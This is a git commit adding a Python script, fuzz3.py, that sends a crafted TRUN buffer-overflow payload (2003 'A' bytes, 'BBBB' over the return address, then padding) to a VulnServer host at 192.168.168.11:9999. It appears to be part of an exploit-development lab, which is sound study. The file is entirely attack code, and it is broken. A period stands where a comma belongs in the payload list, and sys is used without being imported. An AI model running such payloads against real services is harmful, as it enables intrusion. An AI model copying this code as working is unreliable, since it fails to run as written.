01261173db0281200b7d36c18e69fcf0a00bdbb4
Can ÖZKAN <72666934+can-ozkan@users.noreply.github.com>
2025-02-18 22:35:46 +0100

    Create fuzz3.py

---
+++ VulnServerBufferOverflow/fuzz3.py
@@ -0,0 +1,26 @@
+import socket
+
+length = 2992
+
+try: 
+
+    offset = 2003
+
+    s = socket.socket()
+    s.connect( ("192.168.168.11", 9999) )
+
+    payload = [
+        b"TRUN /.:/",
+        b"A" * offset.
+        b"BBBB",
+        b"C" * 976
+    ]
+
+    payload = b"".join(payload)
+
+    s.send(payload)
+    s.close()
+    
+except:
+    print("Could not connect to the target server")
+    sys.exit(1)    
